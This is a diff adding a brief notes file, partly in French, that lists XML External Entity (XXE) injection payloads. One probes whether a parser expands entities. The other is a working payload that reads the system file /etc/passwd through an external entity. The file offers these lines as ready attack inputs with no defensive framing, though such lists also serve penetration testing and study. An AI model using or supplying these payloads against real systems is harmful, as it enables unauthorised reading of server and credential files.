@@ -1,0 +1,8 @@
+- Test vuln presence
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+
+- Lire un fichier systeme
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>  
+<root>
+	&read;
+</root>
